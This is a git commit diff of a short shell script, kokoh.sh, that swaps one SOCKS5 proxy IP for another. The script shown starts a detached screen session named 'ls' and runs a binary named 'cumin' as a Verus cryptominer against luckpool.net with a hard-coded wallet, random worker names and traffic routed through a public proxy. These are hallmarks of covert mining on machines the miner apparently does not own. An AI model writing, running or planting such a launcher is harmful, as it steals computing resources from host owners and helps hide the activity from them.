e6a2506ef5bab3666dc049827dafc3447b3bfbcd
xfdbtry5e <86540555+xfdbtry5e@users.noreply.github.com>
2021-07-09 13:18:05 +0700

    Update kokoh.sh

--- kokoh.sh
+++ kokoh.sh
@@ -6,5 +6,5 @@ screen -dmS ls
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RKq1mFG57gmApqmGxLtXEv2Mm7y3fTZuCX
 WORKER=$(echo $(shuf -i 1-100 -n 1)-Embe)
-PROXY=socks5://72.195.34.58:4145
+PROXY=socks5://213.96.240.156:4145
 ./cumin -a verus -o $POOL -u $WALLET.pion -t 2 -x $PROXY
